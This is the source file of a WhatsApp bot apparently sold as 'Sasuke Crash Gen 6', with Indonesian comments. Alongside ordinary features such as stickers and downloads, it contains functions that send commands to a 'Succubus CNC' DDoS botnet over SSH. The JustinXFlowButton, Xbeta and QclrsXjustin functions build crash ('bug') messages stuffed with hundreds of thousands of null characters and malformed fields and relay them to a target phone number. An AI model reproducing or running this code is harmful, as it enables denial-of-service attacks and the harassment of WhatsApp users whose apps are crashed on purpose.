//SEBAR BY SkyTzy Developer NIH BOS👿

require('./all/Penampung/config');

const fs = require('fs');
const axios = require('axios');
const chalk = require("chalk");
const jimp = require("jimp")
const util = require("util");
const moment = require("moment-timezone");
const path = require("path")
const os = require('os')
const sharp = require('sharp')
const pino = require('pino');
const didyoumean = require('didyoumean');
const similarity = require('similarity');
const figlet = require('figlet');
const yts = require('yt-search');
const gradient = require('gradient-string');
const readline = require("readline");
const logger = pino({ level: 'debug' });
const JsConfuser = require("js-confuser");
const search = require("yt-search");
const { youtube } = require("btch-downloader");
const fetch = require('node-fetch');
const { GoogleGenerativeAI } = require ("@google/generative-ai");
const { Client } = require('ssh2');
const crypto = require('crypto');
const { Sticker } = require("wa-sticker-formatter");
const { teksbug2 } = require("./virtex/button.js")

const {
    spawn, 
    exec,
    execSync 
   } = require('child_process');
const { makeWASocket, makeCacheableSignalKeyStore, downloadContentFromMessage, emitGroupParticipantsUpdate, emitGroupUpdate, generateWAMessageContent, generateWAMessage, makeInMemoryStore, prepareWAMessageMedia, generateWAMessageFromContent, MediaType, areJidsSameUser, WAMessageStatus, downloadAndSaveMediaMessage, AuthenticationState, GroupMetadata, initInMemoryKeyStore, getContentType, MiscMessageGenerationOptions, useSingleFileAuthState, BufferJSON, WAMessageProto, MessageOptions, WAFlag, WANode, WAMetric, ChatModification, MessageTypeProto, WALocationMessage, ReconnectMode, WAContextInfo, proto, WAGroupMetadata, ProxyAgent, waChatKey, MimetypeMap, MediaPathMap, WAContactMessage, WAContactsArrayMessage, WAGroupInviteMessage, WATextMessage, WAMessageContent, WAMessage, BaileysError, WA_MESSAGE_STATUS_TYPE, MediaConnInfo, URL_REGEX, WAUrlInfo, WA_DEFAULT_EPHEMERAL, WAMediaUpload, mentionedJid, processTime, Browser, MessageType, Presence, WA_MESSAGE_STUB_TYPES, Mimetype, relayWAMessage, Browsers, GroupSettingChange, DisconnectReason, WASocket, getStream, WAProto, isBaileys, PHONENUMBER_MCC, AnyMessageContent, useMultiFileAuthState, fetchLatestBaileysVersion, templateMessage, InteractiveMessage, Header } = require('@whiskeysockets/baileys')


module.exports = langgxyz = async (langgxyz, m, chatUpdate, store) => {
    try {
        const body = (
            m.mtype === "conversation" ? m.message.conversation :
            m.mtype === "imageMessage" ? m.message.imageMessage.caption :
            m.mtype === "videoMessage" ? m.message.videoMessage.caption :
            m.mtype === "extendedTextMessage" ? m.message.extendedTextMessage.text :
            m.mtype === "buttonsResponseMessage" ? m.message.buttonsResponseMessage.selectedButtonId :
            m.mtype === "listResponseMessage" ? m.message.listResponseMessage.singleSelectReply.selectedRowId :
            m.mtype === "templateButtonReplyMessage" ? m.message.templateButtonReplyMessage.selectedId :
            m.mtype === "interactiveResponseMessage" ? JSON.parse(m.msg.nativeFlowResponseMessage.paramsJson).id :
            m.mtype === "templateButtonReplyMessage" ? m.msg.selectedId :
            m.mtype === "messageContextInfo" ? m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text : "");
        const content = JSON.stringify(m.message)
        
        const isText = ["extendedTextMessage", "conversation"].includes(m.mtype)
		const isImage = ["imageMessage"].includes(m.mtype)
		const isVideo = ["videoMessage"].includes(m.mtype)
		const isSticker = ["stickerMessage"].includes(m.mtype)
		const isAudio = ["audioMessage"].includes(m.mtype) && !(m.message[m.mtype]?.ptt)
		const isVoice = ["audioMessage"].includes(m.mtype) && !!(m.message[m.mtype]?.ptt)
		const isViewOnce = ["viewOnceMessageV2", "viewOnceMessage"].includes(m.mtype)
		const isContact = ["contactMessage", "contactsArrayMessage"].includes(m.mtype)
		const isLocation = ["locationMessage"].includes(m.mtype)
		const isDocument = ["documentMessage", "documentWithCaptionMessage"].includes(m.mtype)
		const isProtocol = ["protocolMessage"].includes(m.mtype)
		const isPollUpdate = ["pollUpdateMessage"].includes(m.mtype)
		const isPollCreation = ["pollCreationMessage"].includes(m.mtype)
		const isButtonList = ["interactiveResponseMessage"].includes(m.mtype)
		const isButtonReply = ["templateButtonReplyMessage"].includes(m.mtype)
		const isAllMedia = ["imageMessage", "videoMessage", "stickerMessage", "audioMessage", "viewOnceMessageV2", "viewOnceMessage", "contactMessage", "contactsArrayMessage", "locationMessage", "documentMessage", "documentWithCaptionMessage"].includes(m.mtype)
		const isQuotedViewOnce = m.mtype === "extendedTextMessage" && content.includes("viewOnceMessage")
 const getQuoted = (m.quoted || m)      
        const quoted = (getQuoted.type == 'buttonsMessage') ? getQuoted[Object.keys(getQuoted)[1]] : (getQuoted.type == 'templateMessage') ? getQuoted.hydratedTemplate[Object.keys(getQuoted.hydratedTemplate)[1]] : (getQuoted.type == 'product') ? getQuoted[Object.keys(getQuoted)[0]] : m.quoted ? m.quoted : m
        
        const sender = m.key.fromMe ? langgxyz.user.id.split(":")[0] + "@s.whatsapp.net" || langgxyz.user.id
: m.key.participant || m.key.remoteJid;
        
        const senderNumber = sender.split('@')[0];
        const budy = (typeof m.text === 'string' ? m.text : '');
        const prefa = global.prefa

        const prefixRegex = /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/;
        const prefix = prefixRegex.test(body) ? body.match(prefixRegex)[0] : ''
        const from = m.key.remoteJid;
        const isGroup = from.endsWith("@g.us");
        const premium = JSON.parse(fs.readFileSync("./all/database/premium.json"))
        const botNumber = await langgxyz.decodeJid(langgxyz.user.id);
        const isPremium = premium.includes(m.sender)
        const isCmd = body.startsWith(prefix);
        const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : '';
        const command2 = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
        const args = body.trim().split(/ +/).slice(1);
        const pushname = m.pushName || "No Name";
        const isCreator = (m && m.sender && [botNumber, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)) || false;
        const text = q = args.join(" ");
        const mime = (quoted.msg || quoted).mimetype || '';
        const qmsg = (quoted.msg || quoted);
        const isMedia = /image|video|sticker|audio/.test(mime);

        const groupMetadata = isGroup ? await langgxyz.groupMetadata(m.chat).catch((e) => {}) : "";
        const groupOwner = isGroup ? groupMetadata.owner : "";
        const groupName = m.isGroup ? groupMetadata.subject : "";
        const participants = isGroup ? await groupMetadata.participants : "";
        const groupAdmins = isGroup ? await participants.filter((v) => v.admin !== null).map((v) => v.id) : "";
        const groupMembers = isGroup ? groupMetadata.participants : "";
        const isGroupAdmins = isGroup ? groupAdmins.includes(m.sender) : false;
        const isBotGroupAdmins = isGroup ? groupAdmins.includes(botNumber) : false;
        const isBotAdmins = isGroup ? groupAdmins.includes(botNumber) : false;
        const isAdmins = isGroup ? groupAdmins.includes(m.sender) : false;
        
            const { smsg, formatp, tanggal, formatDate, getTime, isUrl, sleep, clockString, runtime, fetchJson, getBuffer, jsonformat, format, parseMention, getRandom, getGroupAdmins } = require('./all/myfunction');
        
const { pinterest, pinterest2, remini, mediafire, tiktokDl , spotifyDl , searchSpotifyTracks, convertDuration, convertAngka, ytdl, tiktokSearchVideo, delay, text2img, listModels, getModels, listSampler, pickRandom, getJobs, spotifyDown, rsz } = require('./all/scraper');

 const {
imageToWebp, 
videoToWebp, 
writeExifImg, 
writeExifVid, 
writeExif, 
addExif 
} = require('./all/exif')  

const { 
   addUser, 
   delUser, 
   listUser
  } = require('./all/sec/User')
  
const { 
    changeKey,
    checkKey,
    getCurrentKey
 } = require('./all/sec/Key')
 
        if (m.message) {
            console.log('\x1b[30m--------------------\x1b[0m');
            console.log(chalk.bgHex("#e74c3c").bold(`▢ New Message`));
            console.log(
                chalk.bgHex("#00FF00").black(
                    `   〽️ Tanggal: ${new Date().toLocaleString()} \n` +
                    `   〽️ Pesan: ${m.body || m.mtype} \n` +
                    `   🐉 Pengirim: ${pushname} \n` +
                    `   🐉 JID: ${senderNumber}`
                )
            );
            
            if (m.isGroup) {
                console.log(
                    chalk.bgHex("#00FF00").black(
                        `   🐉 Grup: ${groupName} \n` +
                        `   🐉 GroupJid: ${m.chat}`
                    )
                );
            }
            console.log();
        }
        const reaction = async (jidss, emoji) => {
            langgxyz.sendMessage(jidss, {
                react: {
                    text: emoji,
                    key: m.key 
                } 
            })
        };
const imageUrls = [
        'https://files.catbox.moe/y62jxh.jpg',
        'https://files.catbox.moe/y62jxh.jpg',
        'https://files.catbox.moe/y62jxh.jpg',
        'https://files.catbox.moe/y62jxh.jpg',
        'https://files.catbox.moe/y62jxh.jpg',
        'https://files.catbox.moe/y62jxh.jpg',
        'https://files.catbox.moe/y62jxh.jpg'
    ]; 
    
    // Randomized Image © Erlangga
    const randomIndex = Math.floor(Math.random() * imageUrls.length);
    const randomImageUrl = imageUrls[randomIndex];

function generateRandomNumber(min, max) {
return Math.floor(Math.random() * (max - min + 1)) + min;
}

// Function Ddos
function cncmyinfo({ host, port, username, password, command }) {
    return new Promise((resolve, reject) => {
        const langgxyz = new Client();
        let outputBuffer = '';
        let commandSent = false;

        langgxyz.on('ready', () => {
            console.log('Connected to Succubus CNC');
            langgxyz.shell((err, stream) => {
                if (err) {
                    langgxyz.end();
                    return reject(`Shell error: ${err.message}`);
                }

                stream.on('data', (chunk) => {
                    outputBuffer += chunk.toString();
                    if (commandSent) {
                        const relevantLines = outputBuffer.split('\n').filter(line => {
                            return line.includes('username=') ||
                                   line.includes('concurrents=') ||
                                   line.includes('timelimit=') ||
                                   line.includes('cooldown=') ||
                                   line.includes('expiry=') ||
                                   line.includes('Myclient=');
                        });

                        if (relevantLines.length > 0) {
                            langgxyz.end();
                            resolve(relevantLines.join('\n').trim());
                        }
                    }
                });

                stream.stderr.on('data', (chunk) => {
                    console.error(chunk.toString());
                });

                stream.write(`${command}\r`);
                commandSent = true;
            });
        }).connect({
            host,
            port,
            username,
            password,
            readyTimeout: 30000
        });

        langgxyz.on('error', (err) => {
            reject(`Connection error: ${err.message}`);
        });
    });
}

function cncAttack({ host, port, username, password, command }) {
    return new Promise((resolve, reject) => {
        const langgxyz = new Client();
        let outputBuffer = '';
        let commandSent = false;
        langgxyz.on('ready', () => {
            console.log('Connected to Succubus CNC');
            langgxyz.shell((err, stream) => {
                if (err) {
                    langgxyz.end();
                    return reject(`Shell error: ${err.message}`);
                }
                stream.on('data', (chunk) => {
                    outputBuffer += chunk.toString();
                    if (commandSent) {
                        const relevantLines = outputBuffer.split('\n').filter(line => {return line.includes(command)});
                        if (relevantLines.length > 0) {
                            console.log(relevantLines)
                            langgxyz.end();
                            resolve(relevantLines.join('\n').trim());
                        }
                    }
                });
                stream.stderr.on('data', (chunk) => {
                    console.error(chunk.toString());
                });
                stream.write(`${command}\r`);
                commandSent = true;
            });
        }).connect({
            host,
            port,
            username,
            password,
            readyTimeout: 30000
        });

        langgxyz.on('error', (err) => {
            reject(`Connection error: ${err.message}`);
        });
    });
}

async function pushOngoing(target, methods, duration) {
    const startTime = Date.now();
    processList.push({ target, methods, startTime, duration })
    setTimeout(() => {
      const index = processList.findIndex((p) => p.methods === methods);
      if (index !== -1) {
        processList.splice(index, 1);
      }
    }, duration * 1000);
  }


            
        const createSerial = (size) => {
return crypto.randomBytes(size).toString('hex').slice(0, size)
}
//END       
        async function loading() {
  const Floading = [
    "𝐋𝐨 . . .",
    "𝐚𝐝 . . .",
    "𝐢𝐧 . . .",
    "𝐠 . . .",
    "𝐋𝐨𝐚𝐝𝐢𝐧𝐠 . . .",
    "*Sasuke Crash Ready To Menu*"
  ];

  let { key } = await langgxyz.sendMessage(from, { text: "𝐒𝐲𝐬𝐭𝐞𝐦 𝐈𝐧𝐢𝐭𝐢𝐚𝐥𝐢𝐳𝐢𝐧𝐠...*" });
  
  for (let i = 0; i < Floading.length; i++) {
    await new Promise(resolve => setTimeout(resolve, 200)); // Efek jeda loading
    await langgxyz.sendMessage(from, { text: Floading[i], edit: key });
  }
}

        langgxyz.ments = async (text) => {
    return [m.sender];
};
  // Thumb Bot          
const cihuy = fs.readFileSync('./all/media/erlangga.jpg')
const marga = fs.readFileSync('./all/media/erlangga3.jpg')
const poto = fs.readFileSync('./all/media/erlangga2.jpg')

// Untuk Pp user or Qc
let ppuser
           try {
           ppuser = await langgxyz.profilePictureUrl(m.sender, 'image')
           } catch (err) {
           ppuser = 'https://files.catbox.moe/ggjkbc.jpg'
           }
            

// Fake Qouted
const qmime = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {locationMessage: {name: `Erlangga Official`,jpegThumbnail: await rsz(poto, 200, 200) }}}
const qgif = {key: {participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {})},message: {"videoMessage": { "title": 'Sasuke Bot', "h": 'Erlangga','seconds': '359996400', 'gifPlayback': 'true', 'caption': 'Sasuke Bot Gen 6', 'jpegThumbnail': ppuser}}}
	// Pengiriman Quoted Fake Live Lokasi V2 //
      const qctc = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {liveLocationMessage: {caption: `Sasuke Crash Gen6`,jpegThumbnail: ""}}}
	// Pengiriman Quoted Fake Permintaan Bayaran //
        const qpayment = {key: {remoteJid: '0@s.whatsapp.net', fromMe: false, id: `ownername`, participant: '0@s.whatsapp.net'}, message: {requestPaymentMessage: {currencyCodeIso8583: "BRL", amount1000: 999999999, requestFrom: '0@s.whatsapp.net', noteMessage: { extendedTextMessage: { text: "Sasuke Bot Crash Gen 6"}}, expiryTimestamp: 999999999, amount: {value: 91929291929, offset: 7777, currencyCode: "BRL"}}}}
	// Pengiriman Quoted Fake Produk Troli //
	const langg ={key: {fromMe: false,"participant":"0@s.whatsapp.net", "remoteJid": "status@broadcast"}, "message": {orderMessage: {itemCount: 2024,status: 200, thumbnail: ppuser, surface: 200, message: `Sasuke Crash`, orderTitle: 't.me/langxyz2', sellerJid: '0@s.whatsapp.net'}}, contextInfo: {"forwardingScore":999,"isForwarded":true},sendEphemeral: true}
    // Pengiriman Fake Audio //
    const qVoice = {key: {participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {})},message: { "audioMessage": {"mimetype":"audio/ogg; codecs=opus","seconds":359996400,"ptt": "true"}}}
	// Pengiriman Quoted Fake Lokasi Runtime //       
        const qjpm = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {locationMessage: {name: `🎭Sasuke Crash: ${runtime(process.uptime())}`,jpegThumbnail: ""}}}
	// Pengiriman Quoted Fake Custom Text //
	const qText = { key: {fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "0@s.whatsapp.net"} : {}) },'message': {extendedTextMessage: {text: "Sasuke Crash Gen 6"}}}
	
	const qtext2 = {key: {remoteJid: "status@broadcast", participant: "0@s.whatsapp.net"}, message: {"extendedTextMessage": {"text": `Erlangga Official`}}}

const erlangga = {
    key: {
        fromMe: false,
        participant: `0@s.whatsapp.net`,
        ...(m.chat ? { remoteJid: "status@broadcast" } : {}),
    },
    message: {
        productMessage: {
            product: {
                title: `Sasuke Crash Gen 6`,
                description: `${pushname} order`,
                currencyCode: "IDR",
                priceAmount1000: "1000000000000",
                retailerId: `Erlangga Official`,
                productImageCount: 1,
                productImage: {
                    mimetype: "image/jpeg",
                    jpegThumbnail: await getBuffer("https://files.catbox.moe/ggjkbc.jpg") // Ambil gambar sebagai buffer
                }
            },
            businessOwnerJid: `0@s.whatsapp.net`,
        },
    },
};
		
		const loli = {
  key: {
    fromMe: false,
    participant: "13135550002@s.whatsapp.net",
    remoteJid: "status@broadcast"
  },
  message: {
    orderMessage: {
      orderId: "2009",
      thumbnail: "https://files.catbox.moe/ggjkbc.jpg",
      itemCount: "9741",
      status: "INQUIRY",
      surface: "CATALOG",
      message: `Sender : @${m.sender.split('@')[0]}\nCommand : ${command}`,
      token: "AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA=="
    }
  },
  contextInfo: {
    mentionedJid: ["120363369514105242@s.whatsapp.net"],
    forwardingScore: 999,
    isForwarded: true,
  }
}

const PayX = {
			key: {
				fromMe: false,
				participant: `0@s.whatsapp.net`,
				...(from ? {
					remoteJid: "@s.whatsapp.net"
				} : {})
			},
			"message": {
				"orderMessage": {
					"orderId": "594071395007984",
					"thumbnail": fs.readFileSync('./all/media/erlangga2.jpg'),
					"thumbnailUrl": "https://files.catbox.moe/ggjkbc.jpg",
					"itemCount": 9741,
					"status": "INQUIRY",
					"surface": "CATALOG",
					"message": `Sender : @${pushname}\nCommand : ${command}`,
					"orderTitle": "© Erlangga Offcial",
					"sellerJid": "18002428478@s.whatsapp.net",
					"token": "AR40+xXRlWKpdJ2ILEqtgoUFd45C8rc1CMYdYG/R2KXrSg==",
					"totalAmount1000": "9741",
					"totalCurrencyCode": "USD"
				}
			}
		}
		
		const qkontak = {
key: {
participant: `0@s.whatsapp.net`,
...(botNumber ? {
remoteJid: `status@broadcast`
} : {})
},
message: {
'contactMessage': {
'displayName': `Sasuke Crash Gen 6`,
'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;ttname,;;;\nFN:ttname\nitem1.TEL;waid=6282137392620:+62 821-3739-2620\nitem1.X-ABLabel:Ponsel\nEND:VCARD`,
sendEphemeral: true
}}
}

// total fitur
const totalFitur = () =>{
            var mytext = fs.readFileSync("./langgxyz.js").toString()
            var numUpper = (mytext.match(/case '/g) || []).length;
            return numUpper
        }
        	
	// END
const Reply = async (teks) => {
return langgxyz.sendMessage(m.chat, {text: teks, mentions: [m.sender], contextInfo: {
externalAdReply: {
title: "Sasuke Crash Gen 6", 
body: `© Erlangga Developer`, 
thumbnailUrl: global.Reply, 
sourceUrl: null, 
}}}, {quoted: PayX })
}

const example = (teks) => {
return `\n *Example Command :*\n *${prefix+command}* ${teks}\n`
}

const nomerCreator =
[
'6282343300202@s.whatsapp.net',
'6282137382620@s.whatsapp.net'
] 
//debug
    async function SasukeDebug(Quoted){
    Reply(`${JSON.stringify(Quoted, null, 2)}`)
    }

// Balasan Untuk Case Yang Tidak Sesuai
if (prefix && command) {
let caseNames = getCaseNames();
function getCaseNames() {
const fs = require('fs');
try {
const data = fs.readFileSync('langgxyz.js', 'utf8');
const casePattern = /case\s+'([^']+)'/g;
const matches = data.match(casePattern);
if (matches) {
const caseNames = matches.map(match => match.replace(/case\s+'([^']+)'/, '$1'));
return caseNames;
} else {
return [];
} } catch (err) {
console.log('Terjadi kesalahan:', err); //tangani Eror
return [];
}}
let noPrefix = command
let mean = didyoumean(noPrefix, caseNames);
let sim = similarity(noPrefix, mean);
let similarityPercentage = parseInt(sim * 100);
if (mean && noPrefix.toLowerCase() !== mean.toLowerCase()) {
let response = `▢ Halo Kak, Apakah kakak sedang mencari ${prefix+mean}?\n▢ Nama menu : ${prefix+mean}`
let buttons = [
        { buttonId: `${mean}`, buttonText: { displayText: `${mean}` } }
    ];

    let buttonMessage = {
        image: { 
            url: "https://files.catbox.moe/ggjkbc.jpg", 
            gifPlayback: true 
        },
        caption: response,
        contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterJid: "120363409054020546@newsletter",
                newsletterName: `Channel Erlangga Developer ͤ͛`
            }
        },
        footer: "© Erlangga Official",
        buttons: buttons,
        viewOnce: true,
        headerType: 6
    };
await langgxyz.sendMessage(m.chat, buttonMessage, { quoted: PayX });
}}
        
// FFUNC STIKER
function getRandomFile(ext) {
    return `${Math.floor(Math.random() * 10000)}${ext}`;
}
        
async function makeStickerFromUrl(imageUrl, langgxyz, m) {
    try {
        let buffer;
        if (imageUrl.startsWith("data:")) {
            const base64Data = imageUrl.split(",")[1];
            buffer = Buffer.from(base64Data, 'base64');
        } else {
            const response = await axios.get(imageUrl, { responseType: 'arraybuffer' });
            buffer = Buffer.from(response.data, "binary");
        }
        
        const webpBuffer = await sharp(buffer)
            .resize(512, 512, { fit: 'contain', background: { r: 255, g: 255, b: 255, alpha: 0 } })
            .webp({ quality: 70 })
            .toBuffer();
        
        const penis = await addExif(webpBuffer, global.packname, global.author)

        const fileName = getRandomFile(".webp");
        fs.writeFileSync(fileName, webpBuffer);

        await langgxyz.sendMessage(m.chat, {
            sticker: penis,
            contextInfo: {
                externalAdReply: {
                    showAdAttribution: true,
                    title: `Sasuke Crash`,
                    body: `Erlangga Developer `,
                    mediaType: 3,
                    renderLargerThumbnail: false,
                    thumbnailUrl: "https://files.catbox.moe/ggjkbc.jpg", 
                    sourceUrl: `https://t.me/langgxyz2`
                }
            }
        }, { quoted: qmime });

        fs.unlinkSync(fileName);
    } catch (error) {
        console.error("Error creating sticker:", error);
        Reply('Terjadi kesalahan saat membuat stiker. Coba lagi nanti.');
    }
}

 async function tiktok2(query) {
  return new Promise(async (resolve, reject) => {
    try {
    const encodedParams = new URLSearchParams();
encodedParams.set('url', query);
encodedParams.set('hd', '1');

      const response = await axios({
        method: 'POST',
        url: 'https://tikwm.com/api/',
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
          'Cookie': 'current_language=en',
          'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36'
        },
        data: encodedParams
      });
      const videos = response.data.data;
        const result = {
          title: videos.title,
          cover: videos.cover,
          origin_cover: videos.origin_cover,
          no_watermark: videos.play,
          watermark: videos.wmplay,
          music: videos.music
        };
        resolve(result);
    } catch (error) {
      reject(error);
    }
  });
}
// FUNC HARI
        const hariini = moment.tz('Asia/Jakarta').format('dddd, DD MMMM YYYY')
const wib = moment.tz('Asia/Jakarta').format('HH : mm : ss')
const wit = moment.tz('Asia/Jayapura').format('HH : mm : ss')
const wita = moment.tz('Asia/Makassar').format('HH : mm : ss')

const time2 = moment().tz('Asia/Jakarta').format('HH:mm:ss')
        if(time2 < "23:59:00"){
        var ucapanWaktu = 'ꜱᴇʟᴀᴍᴀᴛ ᴍᴀʟᴀᴍ️'
        }
        if(time2 < "19:00:00"){
        var ucapanWaktu = 'ꜱᴇʟᴀᴍᴀᴛ ᴘᴇᴛᴀɴɢ'
        }
        if(time2 < "18:00:00"){
        var ucapanWaktu = 'ꜱᴇʟᴀᴍᴀᴛ ꜱᴏʀᴇ'
        }
        if(time2 < "15:00:00"){
        var ucapanWaktu = 'ꜱᴇʟᴀᴍᴀᴛ ꜱɪᴀɴɢ️'
        }
        if(time2 < "10:00:00"){
        var ucapanWaktu = 'ꜱᴇʟᴀᴍᴀᴛ ᴘᴀɢɪ'
        }
        if(time2 < "05:00:00"){
        var ucapanWaktu = 'ꜱᴇʟᴀᴍᴀᴛ ꜱᴜʙᴜʜ'
        }
        if(time2 < "03:00:00"){
        var ucapanWaktu = 'ꜱᴇʟᴀᴍᴀᴛ ᴛᴇɴɢᴀʜ ᴍᴀʟᴀᴍ'
        }
// Auto Sholat
langgxyz.autoshalat = langgxyz.autoshalat ? langgxyz.autoshalat : {}
	let who = m.mentionedJid && m.mentionedJid[0] ? m.mentionedJid[0] : m.fromMe ? langgxyz.user.id : m.sender
	let id = m.chat 
    if(id in langgxyz.autoshalat) {
    return false
    }
    let jadwalSholat = {
    shubuh: '04:50',
    terbit: '05:44',
    dhuha: '06:02',
    dzuhur: '12:02',
    ashar: '15:15',
    magrib: '18:16',
    isya: '19:27',
    }
    const datek = new Date((new Date).toLocaleString("en-US", {
    timeZone: "Asia/Jakarta"  
    }));
    const hours = datek.getHours();
    const minutes = datek.getMinutes();
    const timeNow = `${hours.toString().padStart(2, "0")}:${minutes.toString().padStart(2, "0")}`
    for(let [sholat, waktu] of Object.entries(jadwalSholat)) {
    if(timeNow === waktu) {
    let caption = `Hai kak 👋${pushname},\nWaktu *${sholat}* telah tiba, ambilah air wudhu dan segeralah shalat🙂.\n\n*${waktu}*\n_untuk wilayah Makassar dan sekitarnya._`
    langgxyz.autoshalat[id] = [
    Reply(caption),
    setTimeout(async () => {
    delete langgxyz.autoshalat[m.chat]
    }, 57000)
    ]
    }
    }        
// Function Tiktok
       async function tiktok(text) {
  try {
    const response = await axios.post('https://shinoa.us.kg/api/download/tiktok', {
      text: text
    }, {
      headers: {
        'accept': '*/*',
        'api_key': 'kyuurzy',
        'Content-Type': 'application/json'
      }
    });

    return response.data;
  } catch (error) {
    console.error('Error fetching TikTok video:', error);
    throw error;
  }
}
//end


//Done Resp
async function doneress () {
if (!q) throw "Done Response"
let pepec = q.replace(/[^0-9]/g, "")
let thumbnailUrl = "https://files.catbox.moe/uvungq.mp4"
let ressdone = `
〽️ 𝚂𝚞𝚌𝚌𝚎𝚜 𝚜𝚎𝚗𝚍 𝚋𝚞𝚐 𝚝𝚘 𝚃𝚊𝚛𝚐𝚎𝚝!
〽️ *_${command}_* Sent To : 
🐉 ${pepec}

⏳ 𝗣𝗹𝗲𝗮𝘀𝗲 𝗣𝗮𝘂𝘀𝗲 𝟱 𝗠𝗶𝗻𝘂𝘁𝗲𝘀🎭〽️` 

let buttons = [
        { buttonId: ".menu", buttonText: { displayText: "𝐁𝐚𝐜𝐤 𝐓𝐨 𝐦𝐞𝐧𝐮" } }
    ];

    let buttonMessage = {
        image: marga,
        caption: ressdone,
        contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterJid: "120363409054020546@newsletter",
                newsletterName: "𝐂𝐡𝐚𝐧𝐧𝐞𝐥 𝐄𝐫𝐥𝐚𝐧𝐠𝐠𝐚"
            }
        },
        footer: "© Erlangga Developer",
        buttons: buttons,
        viewOnce: true,
        headerType: 6
    };
await langgxyz.sendMessage(m.chat, buttonMessage, { quoted: qmime });
await langgxyz.sendMessage(m.chat, {audio: fs.readFileSync('./all/sound/final.mp3'), mimetype:'audio/mpeg', ptt: true}, {quoted: m})
}
  // >~~~~~~~~~~ Function ~~~~~~~~~~~< //
const QclrsXjustin = {
    key: {
        remoteJid: '🩸Justin',
        fromMe: false,
        participant: '0@s.whatsapp.net'
    },
    message: {
        "interactiveResponseMessage": {
            "body": {
                "text": "Justin Crash",
                "format": "DEFAULT"
            },
            "nativeFlowResponseMessage": {
                "name": "wraper-osXjustin",
                "paramsJson": `{\"splashscreen_2_OptIn_0\":true,\"splashscreen_2_OptIn_1\":true,\"splashscreen_1_Dropdown_0\":\"𝐉𝐮𝐬𝐭𝐢𝐧𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥\",\"splashscreen_1_DatePicker_1\":\"1028995200000\",\"splashscreen_1_TextInput_2\":\"JustinAndiar\",\"screen_1_TextInput_3\":\"94643116\",\"splashscreen_0_TextInput_0\":\"𝐉𝐮𝐬𝐭𝐢𝐧𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥${"\u0003".repeat(1045000)}\",\"splashscreen_0_TextInput_1\":\"INFINITE\",\"splashscreen_0_Dropdown_2\":\"001-Grimgar\",\"splashscreen_0_wraper-osXjustin_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
                "version": 17
            }
        }
    }
};

async function JustinXFlowButton(target) {
  try {
    let message = {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 1,
          },
          interactiveMessage: {
            contextInfo: {
              remoteJid: "status@broadcast",
              mentionedJid: [target],
              participant: target,
              isForwarded: true,
              forwardingScore: 999,
              forwardedNewsletterMessageInfo: {
                newsletterJid: `33333333333333333@newsletter`,
                newsletterName: "🩸Sasuke Crashh Gen 6〽️🐉",
                businessOwnerJid: target,
              },
            },
            body: {
              text: "‎🩸Sasuke Kill You🐉〽️",
            },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: "",
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: "",
                },
                {
                  name: "galaxy_message",
                  paramsJson: {
                    screen_2_OptIn_0: true,
                    screen_2_OptIn_1: true,
                    screen_1_Dropdown_0: "nullOnTop",
                    screen_1_DatePicker_1: "1028995200000",
                    screen_1_TextInput_2: "null@gmail.com",
                    screen_1_TextInput_3: "94643116",
                    screen_0_TextInput_0: "\u0000".repeat(500000),
                    screen_0_TextInput_1: "SecretDocu",
                    screen_0_Dropdown_2: "#926-Xnull",
                    screen_0_RadioButtonsGroup_3: "0_true",
                    flow_token: "AQAAAAACS5FpgQ_cAAAAAE0QI3s."
                  },
                },
              ],
            },
          },
        },
      },
    };

    await langgxyz.relayMessage(target, message, {
      participant: { jid: target },
    });
  } catch (err) {
    console.log(err);
  }
}

async function Xbeta(target, Ptcp = true) {
  try {
    await langgxyz.relayMessage(
      target,
      {
        ephemeralMessage: {
          message: {
            interactiveMessage: {
              header: {
                locationMessage: {
                  degreesLatitude: -999.03499999999999,
                  degreesLongitude: 999.03499999999999,
                },
                hasMediaAttachment: true,
              },
              body: {
                text:
                  "—Erlangga Is Here\n" + "ꦾ".repeat(30000) +
                  "\u0000".repeat(10000) +
                  "@22222".repeat(20000),
              },
              nativeFlowMessage: {},
              contextInfo: {
                mentionedJid: [target],
                groupMentions: [
                  {
                    groupJid: "0@newsletter",
                    groupSubject: "SiJomokKenapaJirr",
                  },
                ],
                quotedMessage: {
                  documentMessage: {
                    contactVcard: true,
                  },
                },
              },
            },
          },
        },
      },
      {
        participant: { jid: target },
        userJid: target,
      }
    );
  } catch (err) {
    console.log(err);
  }
}

const MessageBug = async (target) => {
  return langgxyz.sendMessage(target, {
    mimetype: "𝗨𝗜 𝗕𝘂𝗴", 
    fileName: "𝗞𝗶𝗹𝗹𝗶𝗻𝗴 𝗚𝗿𝗼𝘂𝗽.zip", 
    fileLength: 99999999999, 
